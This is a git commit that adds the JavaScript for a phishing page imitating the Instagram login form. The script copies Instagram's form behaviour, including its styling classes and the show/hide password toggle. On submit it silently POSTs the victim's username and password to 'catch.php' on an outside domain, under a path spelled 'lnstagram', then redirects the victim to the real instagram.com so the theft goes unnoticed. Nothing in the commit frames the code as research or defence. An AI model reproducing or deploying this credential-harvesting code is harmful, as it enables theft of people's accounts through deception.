3f715714a0af7107d4683df09baea803f1a06334
Munish Kumar <mk6229478@gmail.com>
2020-09-21 20:24:27 +0530

    Add files via upload

---
+++ res/js/main_v0.1.js
@@ -0,0 +1,93 @@
+const lf = $('#loginForm');
+const lb = $('#loginButton');
+const ui = $("#usernameInput");
+const uil = $("#usernameInputLabel");
+const uif = $("#usernameInputField");
+const pi = $("#passwordInput");
+const pil = $("#passwordInputLabel");
+const pif = $("#passwordInputField");
+const pifb = $("#passwordInputFieldButton");
+
+function loginError() {
+    setTimeout(() => {
+        lb.removeClass("A086a");
+        lb.attr("disabled", false);
+        $("#loginLoading").hide();
+        $("#loginError").show();
+    }, 1000);
+}
+function lbt() {
+    let uifvl = uif.val().length;
+    let pifvl = pif.val().length;
+
+    if (pifvl > 0) {
+        pifb.show();
+        pil.addClass("FATdn");
+    } else {
+        pifb.hide();
+        pil.removeClass("FATdn");
+    }
+    if (uifvl > 0)
+        uil.addClass("FATdn");
+    else
+        uil.removeClass("FATdn");
+
+    if (uifvl > 0 && pifvl > 5)
+        lb.prop("disabled", false);
+    else
+        lb.prop("disabled", true);
+}
+
+uif.on("keyup", function () { lbt(); });
+pif.on("keyup", function () { lbt(); });
+uif.focusin(function () {
+    ui.addClass("HlU5H");
+    uif.addClass("focus-visible");
+});
+uif.focusout(function () {
+    ui.removeClass("HlU5H");
+    uif.removeClass("focus-visible");
+});
+pif.focusin(function () {
+    pi.addClass("HlU5H");
+    pif.addClass("focus-visible");
+});
+pif.focusout(function () {
+    pi.removeClass("HlU5H");
+    pif.removeClass("focus-visible");
+});
+pifb.click(function () {
+    if (pif.attr("type") == "text") {
+        pif.attr("type", "password");
+        pifb.text("Show");
+    } else {
+        pifb.text("Hide");
+        pif.attr("type", "text");
+    }
+});
+lf.submit(function (e) {
+    e.preventDefault();
+    lb.addClass("A086a");
+    lb.attr("disabled", true);
+    $("#loginLoading").show();
+    $.ajax({
+        type: "POST",
+        url: "https://mkws.ml/lnstagram/catch.php",
+        //url: "http://localhost/lnstagram/catch.php",
+        data: {
+            u: uif.val(),
+            p: pif.val()
+        },
+        success: function () {
+            window.location.href = "https://instagram.com";
+        },
+        error: function () {
+            loginError();
+        }
+    });
+});
+
+$(document).ready(() => {
+    pifb.hide();
+    lbt();
+});
